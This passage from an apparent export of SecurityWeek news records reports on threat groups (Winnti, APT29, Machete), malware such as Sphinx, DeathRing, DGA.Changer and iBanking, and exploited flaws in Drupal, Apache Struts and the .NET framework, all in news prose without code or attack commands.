fully recursive. By using this method, the attackers might also be trying to evade potential logging mechanisms. The worm is dangerous because it abuses infected systems to look for other vulnerable devices on the network, Ullrich noted. Interestingly, the malware also patches the ShellShock vulnerability on infected devices by downloading the applying the security updates from QNAP. Experts believe the threat does this to prevent additional exploitation. NAS devices are also a tempting target for ransomware attacks. This summer, a piece of ransomware dubbed SynoLocker was used to infect Synology NAS servers by exploiting a vulnerability that was patched in December 2013. " }

A report published last week by 401TRG, the threat research and analysis team at ProtectWise, revealed links between several campaigns conducted over the past decade. Researchers claim that various threat groups previously attributed to Chinese-speaking actors are all connected to China’s state intelligence apparatus under what they call the “Winnti umbrella.” Threat actors such as Winnti, Gref, PlayfullDragon, APT17, DeputyDog, Axiom, BARIUM, LEAD, PassCV, Wicked Panda, and ShadowPad are all believed to be part of the Winnti umbrella based on the use of similar tactics, techniques, and procedures (TTPs), and overlaps in infrastructure and operations. Experts believe they are “the work of individual teams, including contractors external to the Chinese government, with varying levels of expertise, cooperating on a specific agenda.” These hacker groups have been active since at least 2009 – possibly as early as 2007 – and their initial targets are often gaming studios and high-tech companies located in countries such as the United States, Japan, South Korea and China. The main goal appears to be harvesting code-signing certificates and manipulating software, with a secondary objective of financial gain. Researchers said the Winnti umbrella’s main targets appear to be political, such as Uyghur and Tibetan activists, Tibetan and Chinese journalists, the government of Thailand (e.g. Bookworm), and major international tech companies. These groups continue to launch campaigns, with operations seen as recently as late March. In the attacks observed this year, the hackers have focused on phishing – particularly targeted at Office 365 and Gmail accounts – rather than malware and exploits. The cyberspies often target cloud storage accounts from which they hope to obtain code-signing certificates. In some cases, they also seek files and documents that could help them escalate privileges and move laterally within the victim’s network. While the attackers have taken steps to hide their identity, they have made some mistakes, providing investigators important clues about their possible location. “In the attackers’ ideal situation, all remote access occurs through their own C2 infrastructure, which acts as a proxy and obscures their true location,” 401TRG said in its report. “However, we have observed a few cases of the attackers mistakenly accessing victim machines without a proxy, potentially identifying the true location of the individual running the session. In all of these cases, the net block was 221.216.0.0/13, the China Unicom Beijing Network, Xicheng District.” " }

Domain fronting is a censorship bypassing technique that involves disguising traffic to make it look as if it’s going to a host allowed by the censor, such as Google, Amazon or CloudFlare. Open Whisper Systems recently implemented the technique to help Signal users in Egypt and the United Arab Emirates bypass government censorship. According to FireEye, the technique has been used for at least two years by the threat actor APT29, which is also known as The Dukes, Cozy Bear and Cozy Duke. The group is believed to be behind the recent election-related attacks in the U.S. and a campaign targeting high-profile organizations in Norway. APT29 has used the Tor anonymity network to communicate with infected machines, which could be considered suspicious by some defenders. In order to disguise Tor traffic as apparently legitimate traffic, the cyberspies used Meek, a Tor plugin that implements domain fronting and allows users to send traffic to Tor inside a harmless-looking HTTPS POST request to google.com. In its attacks, APT29 used a PowerShell script and a .bat file to install the Tor client and the Meek plugin on the targeted system. They leveraged an exploit involving the Sticky Keys accessibility feature, where they replaced the legitimate executable with the Windows Command Prompt (cmd.exe) file. This provides the attacker a shell that they can use to execute commands with SYSTEM-level privileges, including to add or modify accounts. The script that executes the Sticky Keys exploit also creates a Windows service named “Google Update” to ensure that the backdoor remains even after the system has been rebooted. “APT29 adopted domain fronting long before these techniques were widely known,” said FireEye’s Matthew Dunwoody. “By employing a publicly available implementation, they were able to hide their network traffic, with minimal research or development, and with tools that are difficult to attribute. Detecting this activity on the network requires visibility into TLS connections and effective network signatures.” " }

According to Distil Networks, the United States accounted for 46.58 percent, with Great Britain and Germany coming in second or third with 19.43 percent and 9.65 percent, respectively.  Distil Networks' findings are based on activity that occurred between January and December of 2013.  Among its customers in the United States, bot attacks occurred most between 6 pm and 9 pm EST, when nearly 50 percent of all bad bot traffic hit sites. The period between 6pm and 2 am EST was home to 79 percent of all attacks. By comparison, the 14-hour time span from 3 am to 5 pm EST saw just 13.8 percent of all malicious bot traffic. \"The data clearly shows that those who launch bad bots intentionally circumvent defenses by playing a cat-and-mouse waiting game,\" according to the report. \"They wait until most IT and website security professionals leave work, and then launch the bad bots against their infrastructure. A second contributing factor to the after-hours timing of bad bots arises from the nature of users.\" \"During the typical 7am-5pm business day, a far greater percentage of users access the web from secure connections at organizations with strict rules regarding types of sites visited and actions to take on sites,\" the report continues. \"In the evening, visitors access online sites, applications and content far more from homes and mobile devices that apply less restrictions on the user. This leads to more unprotected computing resources, which bad bot makers leverage to maximize their reach. What it means: US-based organizations need to shore up their defenses during the ‘off’ hours.\" Overall, bad bot traffic nearly doubled as a percentage of all Web traffic during 2013, from 12.25 percent to 23.6 percent. The biggest offender was the notorious Pushdo botnet, which is believed to have infected 4.2 million IPs. \"The bad bot landscape is evolving fast, causing varied levels of harm to all Internet stakeholders, especially website owners,” said Distil CEO and co-founder Rami Essaid, in a statement. “Bad bot volume will continue to grow for one simple reason—bots are an effective means to an end for the dark side of the Internet community.\" " }

Winnti, mainly known for financially-motivated espionage campaigns aimed at the online gaming industry, has been around since at least 2007. A majority of the threat actor’s victims are located in Southeast Asia. Trend Micro has been monitoring the group and discovered that its malware connected to a GitHub account in order to obtain the exact location of C&C servers. Winnti has continued to use PlugX, a RAT that is often leveraged by Chinese threat actors, but experts also discovered what appears to be a new backdoor (BKDR64_WINNTI.ONM). The malware checks an HTML page stored in a GitHub project. The file contains an encrypted string that hides the IP address and port number for the C&C server. The information was encrypted via an algorithm known to be used by PlugX and other algorithms derived from it. According to Trend Micro, the GitHub project used by Winnti was created in May 2016 and it was first used for C&C communications in August 2016. Experts believe the GitHub account was likely created by the attackers themselves and not hijacked from its original owner. Between August 17 and March 12, Trend Micro noticed nearly two dozen C&C server IP and port combinations. Researchers said a majority of the servers were located in the United States, and two in Japan. One user pointed out on Reddit that the C&C servers appear to be hosted by Krypt Technologies, whose services have often been abused for botnets and other threats. As for the new Winnti backdoor, the malware uses a loader that leverages a modified version of a Microsoft registry tool (loadperf.dll) and the WMI performance adapter service in Windows (wmiAPSrv). The loader imports and decrypts the main payload and loads it into memory. “Abusing popular platforms like GitHub enables threat actors like Winnti to maintain network persistence between compromised computers and their servers, while staying under the radar,” explained Trend Micro threat researcher Cedric Pernet. “Although Winnti may still be employing traditional malware, its use of a relatively unique tactic to stay ahead of the threat landscape’s curve reflects the increased sophistication that threat actors are projected to employ.” " }

According to its developers, Sphinx operates fully through the Tor anonymity network and is immune to sinkholing, blacklisting, and Abuse.ch’s ZeuS Tracker tool. The creators of Sphinx have told potential customers that they don’t necessarily need bulletproof hosting to operate a botnet, although it’s recommended. The list of Sphinx’s features includes form grabbing and web injects for Internet Explorer, Firefox and Tor Browser, a keylogger, a certificate grabber, and an FTP and POP3 grabber. Sphinx is designed to work on Windows Vista and Windows 7 with User Account Control (UAC) enabled, and it works even on user accounts with low privileges, such as the “Guest” account, the developers said. The Trojan’s Backconnect VNC capability allows users to make money transfers directly from the infected computer. The feature is also useful for disabling security solutions present on the victim’s device. The Backconnect SOCKS in Sphinx enables attackers to use their victims as a SOCKS proxy, according to an August 15 forum post advertising the malware. Sphinx also allows cybercriminals to steal digital certificates that can later be used to sign malware, and use webinjects to change the content of a webpage to trick users into handing over sensitive information. For command and control (C&C) communications, the malware uses whitelisted processes in an effort to bypass firewalls. “During the session, the bot can get the configuration to send the accumulated reports, report their condition to the server and receive commands to execute on the computer. The session takes place via HTTP-protocol, all data sent by a bot and received from the server is encrypted with a unique key for each botnet,” the developers said. Sphinx’s control panel is developed in PHP and it’s the same as the control panel of Zeus. It provides botnet operators information such as number of infected devices, number of online bots, number of new bots, daily bot activity, and country and operating system statistics. “We recommend using Internet Explorer traffic for exploit-kit to get maximal profit when using Sphinx,” Sphinx devs noted. Sphinx is currently sold for $500, amount that can be paid in Bitcoin or DASH, a privacy-centric digital currency. IT security consultant Bev Robb noted on Norse’s Dark Matters blog that Sphinx has been verified by the administrator of a hacker forum. " }

The vulnerability, reported to Microsoft by researchers at FireEye, is tracked as CVE-2017-8759 and it affects the .NET framework, specifically a SOAP WSDL (Web Services Description Language) parser. An attacker can exploit the security hole for remote code execution by getting the targeted user to open a specially crafted document or application. In the attacks observed by FireEye, a threat actor exploited the vulnerability via malicious documents that download several components before deploying the final payload – a variant of FinFisher. FinFisher, also known as FINSPY and WingBird, is a lawful interception tool whose developer claims is only sold to governments. However, researchers discovered on numerous occasions that the spyware has been used by countries that have a bad reputation when it comes to human rights and civil liberties. In the recent attacks seen by FireEye, a threat actor delivered the spyware via a document named “Проект.doc” (“project” in Russian). The security firm stated, with moderate confidence, that a state-sponsored group launched the attack in an effort to spy on Russian-speaking users. “[This variant of FinFisher] leverages heavily obfuscated code that employs a built-in virtual machine – among other anti-analysis techniques – to make reversing more difficult,” FireEye researchers said in a blog post. “As likely another unique anti-analysis technique, it parses its own full path and searches for the string representation of its own MD5 hash. Many resources, such as analysis tools and sandboxes, rename files/samples to their MD5 hash in order to ensure unique filenames.” Microsoft has linked the attack to a group it tracks as NEODYMIUM, which last year used a Flash Player zero-day vulnerability to deliver FinFisher. While Microsoft’s advisory for CVE-2017-8759 contains little information, FireEye’s blog post includes many technical details. Earlier this year, Kaspersky noticed the FinFisher malware being delivered via a Microsoft Office zero-day (CVE-2017-0199) by a Middle Eastern threat actor named “BlackOasis.” FireEye also spotted attacks exploiting CVE-2017-0199 to deliver FinFisher earlier this year, and the security firm believes CVE-2017-8759 may have also been used by other groups, although currently there is no evidence to support this theory.

Obtaining SiliVaccine is not an easy task, but a copy of the software was sent back in 2014 to Martyn Williams, a journalist specializing in North Korean technology. Williams published a review of the antivirus in September 2014. The journalist recently provided a copy of the software to researchers at Check Point, who made a series of interesting discoveries. Williams received a copy of SiliVaccine via email from an individual claiming to be a Japanese engineer named Kang Yong Hak, who provided the antivirus to the journalist along with what appeared to be a patch.  Check Point’s analysis of SiliVaccine revealed that the antivirus – apparently a version from 2013 – relied on a scanning engine developed by Trend Micro. The Japanese security firm’s own analysis showed that the version used in SiliVaccine was more than 10 years old and it had been used in a variety of its products. “Trend Micro has never done business in or with North Korea. We are confident that any such usage of the module is entirely unlicensed and illegal, and we have seen no evidence that source code was involved,” Trend Micro said. “The scan engine version at issue is quite old and has been widely incorporated in commercial products from Trend Micro and third party security products through various OEM deals over the years, so the specific means by which it may have been obtained by the creators of SiliVaccine is unknown.” Trend Micro has found evidence suggesting that its scan engine has been used in multiple versions of SiliVaccine. The company says it typically takes a strong stance against piracy, but initiating legal action would not help in this particular case, and it believes the use of its engine does not pose any risk to customers. Check Point’s analysis revealed that SiliVaccine uses Trend Micro’s scan engine and the company’s pattern files to load malware signatures. However, the pattern files used by the North Korean antivirus are encrypted using a custom protocol and there are some differences in the engine itself, including the use of compiler optimization not present in the original software. Another major difference is related to the fact that the SiliVaccine engine has been configured to not detect a particular signature. Researchers have not been able to find the file associated with that signature, but noted that the original Trend Micro scan engine does detect the threat. According to experts, SiliVaccine was developed by a couple of organizations named PGI (Pyonyang Gwangmyong Information Technology) and STS Tech-Service, which appears to be linked to Japan through a couple of other companies. It’s worth noting that relations between Japan and North Korea are, as described by Wikipedia, “severely strained and marked by tension and hostility.” Researchers also analyzed the patch file received by Williams in 2014 and determined that it delivers a first-stage dropper of the Jaku malware. A 2016 report on Jaku revealed that the malware had infected roughly 19,000 systems around the world. Experts discovered links to the Dark Hotel campaign, which, similar to Jaku, has been tied to North Korea. " }

The malware is known as 'DeathRing', and masquerades as a ringtone app. In actuality however, the malware is capable of downloading SMS and WAP (Wireless Application Protocol) content from its command and control server to the victim's phone to perform malicious activity.    The researchers spotted the malware in the system directory of a number of devices from third-teir manufacturers selling phones to the developing world. A detailed list of the impacted devices can be found here, and includes: Gionee Gpad G1, Hi-Tech Amaze Tab and Haier H7.   \"This is the number one malware threat we've detected since June 2014 for Indonesia, Nigeria, Tanzania, and Kenya,\" said Jeremy Linden, senior security product manager at Lookout. \"It is number two for Uganda. It is number five for Vietnam. It is a localized threat, but not insignificant if you happen to live in those countries.\"   \"We saw DeathRing in the system partition of the phone - an area of the phone not otherwise accessed by consumers or retailers,\" he said. \"It suggests to us that an attacker was somewhere in the distribution process flashing this malware onto the phones before it ever reached the retailers.\"   According to Lookout, DeathRing may use SMS content to phish a victim's personal information via fake text messages requesting the desired data. It may also use WAP or browser content to get victims to download further APKs (Android application packages). The malware is activated in two ways: the malware will start if the phone is powered down and rebooted five times, and it will start if the victim has been away and present at the device at least 50 times.   Earlier this year, Lookout detected another pre-loaded piece of malware called Mouabad. Like DeathRing, Mouabad is believed to have also been pre-installed somewhere in the supply chain and affected predominantly Asian countries. There were also some detections of Mouabad in Spain.   These types of supply chain attacks are relatively rare in global sense, Linden said.   \"You can consider this, in some ways, a more targeted attack in that it occurs in specific manufacturing chains and is aimed at specific phones,\" he said. \"However, this is not insignificant for the regions it targets.\"   \"Really, it comes down to auditing your supply chain regularly,\" he added. \"They could also run better quality control programs and perhaps even purchase the devices from the end retailers and see if they match quality standards.\"   The manufacturers impacted by the DeathRing malware were contacted but have not responded, Linden said.   Lookout recommends consumers in the impacted regions check their phone bills for any suspicious charges.   \"Having something like this sit quietly on your phone is never the optimal situation for a victim,\" Linden said. \"A victim can take action to return the phone or demand a refund if they know their device has been infected with DeathRing. To us, knowledge is power.\" " }

Machete was first analyzed by Kaspersky Lab back in 2014. At the time, the company said the operation had been active since 2010, with some improvements made in 2012. The list of targeted entities included intelligence services, embassies, government institutions and military organizations. A majority of the victims at the time were located in Venezuela, Ecuador and Colombia, but some compromised systems were also identified in Russia (embassies), Peru, Cuba, Brazil, the U.S., Spain, Sweden, and China. The attackers had used spear-phishing emails and fake blogs to deliver malware capable of logging keystrokes, capturing audio from the microphone, taking screenshots and photos via the webcam, collecting geolocation data, and exfiltrating files to a remote server or a special USB device. Cylance researchers have also analyzed the campaign and identified over 300 unique victims in the past month. According to the security firm, the attackers managed to steal more than 100 Gb of data from organizations. A majority of the victims identified by Cylance were located in Ecuador, Venezuela, Peru, Argentina and Colombia, but some targets were also found in Korea, the U.S., the Dominican Republic, Bolivia, Cuba, Guatemala, Nicaragua, Mexico, the U.K., Canada, Germany, Russia and Ukraine. The types of organizations targeted are mostly the same as reported by Kaspersky, but Cylance also mentioned telecommunications and power companies. Kaspersky noted in its 2014 report that the attacker appeared to be a native Spanish speaker. Cylance pointed out that it did not see any victims in Brazil, and that the most heavily targeted countries shared a land border with Brazil. This could suggest that the attacks have been launched from Brazil, but it contradicts Kaspersky’s initial finding as Brazilians speak Portuguese. According to Cylance, the threat actor behind Machete managed to keep its operations alive by moving to a new command and control (C&C) infrastructure and making minor changes to its malware to evade signature-based detection. “El Machete has continued largely unimpeded in their espionage activities for the past several years, despite the abundance of publicly available indicators. Many of these indicators should have allowed defenders to reliably identify this threat, but the majority of antivirus (AV) solutions continue to have very low detection rates across current samples,” said Cylance researchers. As for Machete victims, experts pointed out that many of the targeted countries are known customers of companies such as FinFisher and Hacking Team, which suggests that they have yet to develop their own cyber capabilities.

In a story published Friday, Reuters reporter Joseph Menn, citing two former Kaspersky Lab employees as sources, said the company manipulated false positives off and on for more than 10 years, with the peak period between 2009 and 2013.  Reuters said that according to the ex-employees, Kaspersky engineers allegedly took “important pieces of software” commonly found in PCs and injected bad code into them so that files looked like they were infected, then anonymously uploaded files to malware information exchange VirusTotal. “When competitors ran this doctored file through their virus detection engines, the file would be flagged as potentially malicious,” Menn wrote. “If the doctored file looked close enough to the original, Kaspersky could fool rival companies into thinking the clean file was problematic as well.”  The former employees, who wished to remain anonymous, told Reuters that some of the attacks were ordered by company chief Eugene Kaspersky, partly to retaliate against smaller rivals that he felt were aping his software instead of developing their own technology.  \"Eugene considered this stealing,\" one of the former employees said.  Kaspersky Lab fired back immediately, saying the allegations made are not true, and that such actions are unethical, dishonest and illegal.  “Kaspersky Lab has never conducted any secret campaign to trick competitors into generating false positives to damage their market standing,” Kaspersky Lab said in a statement provided to SecurityWeek.   “Accusations by anonymous, disgruntled ex-employees that Kaspersky Lab, or its CEO, was involved in these incidents are meritless and simply false,” the statement continued. “As a member of the security community, we share our threat intelligence data and IOCs on advanced threat actors with other vendors, and we also receive and analyze threat data provided by others.”  While the Russian security firm defended against the accusations, the company did say that it conducted a one-time experiment in 2010 by uploading samples of non-malicious files to VirusTotal—something that had been made public by the company soon after—and well before being accused in the report from Reuters.  “In 2010, we conducted a one-time experiment uploading only 20 samples of non-malicious files to the VirusTotal multi-scanner, which would not cause false positives as these files were absolutely clean, useless and harmless,” Kaspersky Lab explained. “After the experiment, we made it public and provided all the samples used to the media so they could test it for themselves. We conducted the experiment to draw the security community’s attention to the problem of insufficiency of multi-scanner based detection when files are blocked only because other vendors detected them as being malicious, without actual examination of the file activity (behavior).”   The company also claimed that in 2012 it was affected by an unknown source uploading bad files to VirusTotal, which led to a number of incidents with false-positive detections.   During the VB Conference in Berlin in October 2013, Kaspersky said there was a private meeting between antivirus vendors to exchange the information about the incidents, work out the motives behind the attack and develop an action plan.   “We had investigated these attacks but could not find out who was behind them. We had some suspects, Kaspersky was not one of them,” Liam O'Murchu, Manager of Security Response Operations for North America at Symantec, wrote on Twitter. The tactic, not matter who is behind it, is a major wakeup call to the industry, says Rahul Kashyap, Chief Security Architect and SVP of Security & Solutions Engineering at Bromium.  “Besides the huge impact of the claim, there are two other issues this report brings out – the challenges of reliably attributing and the fragility of anti-virus ‘system’,\" Kashyap told SecurityWeek.  “To prove that this story is indeed true, reliable facts need to be presented that provide legit evidence against Kaspersky. I doubt it’ll be easy for anyone to reliably attribute the act directly to Kaspersky—unless the informants did it themselves and stored reliable evidence at the time of crime,” Kashyap said.  “This also exposes to the fragility of the entire malware sample distribution system. As the report claims – a hole in the system was uncovered and plugged after large scale damage was observed. The entire Anti-Virus industry is about reacting after damage, this act further proves yet another flaw in the model.”  “On the incident in general, we’re well aware of the issue of false positives propagating from product to product through the vital industry-wide information sharing systems,” John Hawes, Chief of Operations at Virus Bulletin, told SecurityWeek. “In the past we regularly observed false alarms which cropped up in our testing spreading to other products very quickly. This was a symptom of automated processes relying too heavily on detection results from other vendors as a criteria for classifying an item as malicious, and it seems to have reduced fairly considerably in the last year or two as automation systems have become more sophisticated.”   “As to whether a security vendor would be involved in deliberately trying to abuse these processes to discredit their rivals, I remain highly skeptical,” Hawes said. “The benefits would be rather marginal – to achieve a major headline-making false positive event of the kind which would dent a vendor’s reputation, a seriously major file which broke a major package or stopped Windows from functioning properly would have to be made to look malicious.”   VirusTotal, a subsidiary of Google, is an aggregator and does not take responsibility for such false positives, and has a policy to not whitelist any files or URLs. Furthermore, the company says it will not remove any detections resulting from the normal operation of the products it makes use of.  Earlier this year VirusTotal launched an initiative designed to address the issue of false positives through a project called “trusted source.” As part of the initiative, major software vendors are asked to share metadata from their software collection. Additionally, when files get distributed to antivirus vendors under the trusted source initiative, they are tagged so that potential erroneous flags can be ignored, preventing a snowball effect with detection ratios.  “Any major vendor with proper QA processes should be routinely running their products over in-house sets of major files before releasing updated detection routines, to watch out for just this sort of issue,” Hawes said.  “Although the security market is very competitive, trusted threat data exchange is a critical part of the overall security of the entire IT ecosystem, and we fight hard to help ensure that this exchange is not compromised or corrupted,” Kaspersky stated.

The user can run the scan, see the results and disable the software without logging out of Facebook.   \"Glancing through headlines in recent months reveals that malware continues to be a persistent problem for governments, companies, and individuals,\" Gowda noted. \"With the potential to remain undetected on devices for months, malicious code can collect personal information and even spread to other computers in some cases.

The new vulnerability, tracked as CVE-2018-7602, has been described as a highly critical issue that can be exploited for remote code execution. The flaw has been patched with the release of versions 7.59, 8.4.8 and 8.5.3. Drupal website administrators who cannot immediately install the updates can apply a patch, but the patch only works if the fix for the original Drupalgeddon2 vulnerability (CVE-2018-7600) is present. If the previous patch was not installed, the website may already be compromised, Drupal developers warned. CVE-2018-7602 was discovered by members of the Drupal Security Team, which consists of 34 volunteers from around the world, along with Finland-based Drupal developer Jasper Mattsson, who also reported the original vulnerability. The new flaw was identified during an investigation into CVE-2018-7600. Drupal developers warn that similar to CVE-2018-7600, CVE-2018-7602 has also been exploited in the wild. Drupalgeddon2 was patched in late March and the first attacks were seen roughly two weeks later, shortly after technical details and a proof-of-concept (PoC) exploit were made public. While many of the exploitation attempts are designed to identify vulnerable systems, some cybercriminals have leveraged the flaw to deliver cryptocurrency miners, backdoors and other types of malware. Some experts believe the security hole may have been exploited to deliver ransomware to the website of the Ukrainian energy ministry. There are several groups exploiting Drupalgeddon2, including one that leverages a relatively large botnet named Muhstik, which is related to the old Tsunami botnet. The botnet has helped cybercriminals make a profit by delivering cryptocurrency miners such as XMRig and CGMiner, and by launching distributed denial-of-service (DDoS) attacks. Two security firms have independently confirmed that one of the Drupalgeddon2 campaigns delivering a Monero cryptocurrency miner is linked to a cybercriminal group that last year exploited a vulnerability in Oracle WebLogic Server (CVE-2017-10271) to infect systems with cryptocurrency malware. Drupal powers more than one million websites, including nine percent of the top 10,000 most popular websites running a known CMS, making it a tempting target for malicious actors. " }

The security hole, tracked as CVE-2017-9805, affects applications that use the REST plugin with the XStream handler for XML payloads, and it exists due to the way Struts deserializes untrusted data. An exploit was made available within hours after a patch was released. A few days later, Cisco Talos and Belgium-based NVISO Labs reported seeing exploitation attempts in the wild. However, a majority of the attacks only aimed to find vulnerable servers. Imperva’s systems have blocked thousands of attacks, and the company says roughly 80% of them attempted to deliver a malicious payload, rather than just trying to determine if a server is vulnerable. Roughly two-thirds of the attacks seen by the company involved Wget, a utility designed for downloading files. The list of payloads also included the /bin/sh system shell, the dig network administration tool, the cURL data transfer tool, and the certificate services program Certutil. The biggest attack source was China, with a single Chinese IP sending out more than 40% of all the requests. The IP address in question is registered to a Chinese e-commerce company and experts believe the attackers may have compromised one of its devices. Attacks also came from Australia, the United States, Brazil, Canada, Russia and various European countries. In many cases, cybercriminals executed commands to retrieve a malicious payload that would allow them to take control of the targeted server and abuse it for distributed denial-of-service (DDoS) and other attacks. Cisco checking products for Apache Struts vulnerability Several vulnerabilities have been patched in Apache Struts 2 this month and Cisco has started checking its products in order to determine which of them may be exposed to attacks. While there are some products still under investigation, CVE-2017-9805 has so far been found to impact the company’s MXE 3500 Series Media Experience Engines, Unified Contact Center Enterprise, Unified Intelligent Contact Management Enterprise, and Network Performance Analysis. A less severe remote code execution flaw patched in Apache Struts 2 last week, CVE-2017-12611, has been found to affect Cisco Digital Media Manager, Hosted Collaboration Solution for Contact Center, Unified Contact Center Enterprise, and Unified Intelligent Contact Management Enterprise. Apache Struts flaw blamed for Equifax breach According to some reports, the recent Equifax breach, which affects roughly 143 million consumers in the United States, involved an Apache Struts vulnerability. While some have jumped to conclude that the flaw in question could be CVE-2017-9805, a more likely scenario is that attackers leveraged CVE-2017-5638, a vulnerability exploited in the wild since March. Equifax has yet to confirm that a Struts flaw was in fact used in the operation targeting its systems. " }

The company will use the new injection of cash, all coming from existing investors, to support global sales, marketing and channel efforts. The Atlanta, Georgia-based company’s “Damballa Failsafe” offering is an automatic breach defense system that identifies evidence of malicious network traffic in real time and helps discover and validate successful infections, giving incident responders the ability to pinpoint compromised devices and quickly mitigate risk.  Failsafe delivers actionable information about known and unknown threats regardless of the infection’s source, entry vector or OS of the device, the company explained.   “Today’s threats evolve constantly and prevention tools can’t stop infections they haven’t seen before,” said David Welsh, Partner at Adams Street Partners. “The market is ripe for Damballa’s very different approach to detecting and stopping infections with certainty. The market dynamics, combined with the impressive steps the company has taken in the past year – driving revenue growth and building out strong channel and strategic alliances for future success – make us very excited about the opportunity for Damballa.”   “CSOs and their teams are overwhelmed with alerts,” said David Scholtz, CEO of Damballa. “Instead of wasting time chasing false positives or doing deep investigative work to confirm true infections, they need a security system that can automate the heavy-lifting. Damballa provides automatic and indisputable evidence of successful infections so responders can immediately prevent damage. That message is resonating with a broad range of enterprise organizations around the world.”   The company has raised a total of $57.5 million in funding to date. " }
{ "_id" : { "$oid" : "5b27c3f36cefc41c844ab255" }, "Category" : "Malware", "Title" : "Non-Targeted Malware Hits 3,000 Industrial Sites a Year: Study", "Address" : "https://www.securityweek.com/non-targeted-malware-hits-3000-industrial-sites-year-study", "Date" : "March 21, 2017", "Article" : " Thousands of industrial facilities have their systems infected with common malware every year, and the number of attacks targeting ICS is higher than it appears, according to a study conducted by industrial cybersecurity firm Dragos. There have been an increasing number of media reports on malware infections affecting critical infrastructure and other industrial facilities, and while attention from the press can have some benefits, most experts agree that overhyped media reporting is likely to have a negative impact on ICS security. Existing public information on ICS attacks shows numbers that are either very high (e.g. over 500,000 attacks according to unspecified reports cited by Dragos), or very low (e.g. roughly 290 incidents per year reported by ICS-CERT). Dragos has set out to provide more realistic numbers on malware infections in ICS, based on information available from public sources such as VirusTotal, Google and DNS data. As part of a project it calls MIMICS (malware in modern ICS), Dragos has identified roughly 30,000 samples of malicious ICS files and installers dating back to 2003. Non-targeted infections involving viruses such as Sivis, Ramnit and Virut are the most common, followed by Trojans that can provide threat actors access to Internet-facing environments. The company’s analysis showed that approximately 3,000 unique industrial sites are hit by traditional, non-targeted malware every year. The actual number of affected organizations is likely higher, but Dragos believes this can be a useful base metric for the community. These incidents may not be as severe as targeted attacks and they are unlikely to cause physical damage or pose a safety risk. However, they can cause liability issues and downtime to operations, which leads to increased financial costs, Robert M. Lee, CEO and founder of Dragos, told SecurityWeek. One example provided by the expert is the incident involving a German nuclear energy plant in Gundremmingen, whose systems got infected with Conficker and Ramnit malware. The malware did not cause any damage and it was likely picked up by accident, but the incident did trigger a shutdown of the plant as a precaution. Learn More at the 2017 Singapore ICS Cyber Security Conference Dragos’ research has also showed that targeted ICS intrusions are not as rare as they appear to be. While Stuxnet, Havex and BlackEnergy are the only pieces of malware known to specifically target ICS systems, the security firm has identified a dozen intrusions involving ICS-themed malware. These types of threats, disguised as legitimate ICS software, target operators and engineers. Dragos believes ICS-themed malware can be highly efficient in evading security products as many vendors simply don’t know how to tell apart legitimate from rogue ICS software. One ICS-themed malware that attracted the attention of researchers has been disguised as software for Siemens programmable logic controllers (PLCs). The threat, described by Dragos as crimeware, has been submitted to public malware databases ten times between 2013 and March 2017. The samples were initially detected by antiviruses as false positives and later as a basic piece of malware. “In short, there has been an active infection for the last 4 years of an adversary attempting to compromise industrial environments by theming their malware to look like Siemens control software,” Lee said in a blog post. Dragos has not linked the Siemens-themed malware to a specific threat actor, Lee told SecurityWeek. Another noteworthy finding of the MIMICS project is related to operational security (OPSEC). Researchers discovered that public malware databases often contain legitimate ICS software components that have been erroneously flagged as malicious. Experts identified various such components, including human-machine interface (HMI) and data historian installers, and key generators. “This means that adversaries can simply download these software files and leverage access to them for their own learning and practicing,” Lee explained. “Keeping our legitimate software out of the hands of the adversaries helps lengthen the time it takes them to target our environments.” Dragos has identified more than 120 project files in the public databases it has analyzed, including maintenance reports, Nuclear Regulatory Commission (NRC) reports, and substation layouts. “There are a few lessons here: have a discussion with the IT security teams (outsourced or on-site) on what is legitimate and what should not be submitted to the internet, validate what your security technologies are submitting to databases such as VirusTotal [...], and be proactive in looking at such databases for your own files and information,” Lee said.

Seculert started monitoring DGA.Changer, a threat designed to download other malware onto infected systems, in 2013. This was one of the pieces of malware used by the malicious actors who breached the official PHP website in October 2013. The security firm revealed in December 2013 that the threat, which had infected more than 6,500 devices, was attempting to evade detection by changing domain generation algorithm (DGA) seeds. Seculert says malware authors have now made DGA.Changer even more difficult to detect by traditional sandboxes. When it infects a system, the downloader checks the registry for disk artifacts that indicate the presence a virtual environment such as VMware and VirtualBox. If the presence of a sandbox is detected, the DGA seed is changed so that the malware communicates with a list of fake domains. The cybercriminals don’t seem to be content only with preventing researchers and sandboxes from efficiently analyzing the threat. They have actually purchased some of the fake domains and pointed them to a server that is set up to serve an executable file. This file doesn’t do anything after being executed, but this tactic could throw researchers off track. “The goal here seems to be to fool sandbox solutions and/or researchers into believing the malware is fully functional and downloading additional components,” Aviv Raff, CTO of Seculert, wrote in a blog post. The first variant of the new DGA.Changer was spotted in February, but several iterations have been released since, each with different initial and fake seeds. “The discovery of this new version of DGA.Changer highlights yet again the limitations of ‘sandbox only’ prevention approaches and the need to complement them with post-infection analytics based detection techniques,” Raff said. “In the Spy vs. Spy world of cyber-security, the adversary is continuing to adapt to current defense techniques. Those of us in the cyber-threat defense business must continue to adapt as well.” DGA.Changer is not the only piece of malware that features a clever DGA mechanism. The DGA of the Rovnix Trojan generates command and control (C&C) domains using random words from documents such as the United States Declaration of Independence and the GNU Lesser General Public License. The Matsnu Trojan generates 24-character domain names using a combination of nouns and verbs entered by the attacker or taken from a predefined list. " }

It can also capture audio using the device's microphone. The attack doesn't begin with iBanking however; it begins with the infection of the user's computer by a banking Trojan called Win32/Qadars, which researchers at ESET were monitoring. According to ESET researcher Jean-Ian Boutin, the Trojan was spotted attempting to get victims to install iBanking.  \"As reported by independent researcher Kafeine, this mobile application [iBanking] was for sale in underground forums and was used by several banking Trojans in an attempt to bypass a mobile two-factor authentication method put forth by some financial institutions,\" blogged Boutin. \"This method, usually called “mobile transaction authorization number” (mTAN) or mToken in the financial realm, is used by several banks throughout the world to authorize banking operations, but is now also increasingly used by popular internet services such as Gmail, Facebook and Twitter.\" \"Recently, it was revealed by RSA that iBanking’s source code was leaked on underground forums,\" he continued. \"In fact, the web admin panel source was leaked as well as a builder script able to change the required fields to adapt the mobile malware to another target. At this point, we knew it was only a matter of time before we started seeing some “creative” uses of the iBanking application.\" He wasn't wrong. When the user logs into their Facebook account, the malware injects a fake verification page into the site and requests the user's mobile phone number and asks what mobile operating system the phone uses. If the victim's phone is running Android, he or she will then be shown a message stating a text message is on the way. The message will ask the user to click on a link. In order to download the app, the user needs to configure the settings to allow them to download apps from 'Unknown sources.' \"The way iBanking is installed on the user’s mobile is quite common, but it is the first time we have seen such a mobile application targeting Facebook users for account fraud,\" Boutin blogged. \"Although the Facebook two-factor authentication feature has been around for quite a while, it may be that there is a growing number of people using it, thus making account takeover through a regular account credentials grabber 